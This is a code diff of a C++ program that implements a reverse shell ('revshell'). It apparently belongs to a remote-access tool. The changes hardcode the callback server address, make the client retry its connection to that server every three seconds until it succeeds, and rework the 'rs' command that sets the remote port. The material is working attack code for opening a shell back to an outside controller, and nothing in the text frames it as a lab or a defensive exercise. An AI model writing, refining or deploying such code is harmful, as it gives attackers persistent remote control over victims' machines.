@@ -6,7 +6,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 
-// #define WAIT_FOR_CLIENT
+#define WAIT_FOR_CLIENT
 
 typedef std::vector<std::string> ARGS;
 
@@ -29,13 +29,12 @@ int revshell(int port){
         struct sockaddr_in sa;
         sa.sin_family = AF_INET;
         sa.sin_port = htons(port);
-        sa.sin_addr.s_addr = inet_addr(get_ip_addr());
+        sa.sin_addr.s_addr = inet_addr(serv_ip_addr);
         int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-        sleep(1);
         int cf;
 #ifdef WAIT_FOR_CLIENT
         while (connect(sockfd, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
-            sleep(5);
+            sleep(3);
         }
 #else
         if ((cf = connect(sockfd, (struct sockaddr*)&sa, sizeof(sa))) != 0){
@@ -53,10 +52,7 @@ int revshell(int port){
     return 0;
 }
 
-int port;
-int get_port(){
-    return port;
-}
+int rport;
 
 int rs(ARGS args){
     if (args.size() != 1){
@@ -69,6 +65,6 @@ int rs(ARGS args){
     catch (...){
         return 1;
     }
-    port = p;
+    rport = p;
     return 99; //stop accept signal
 }
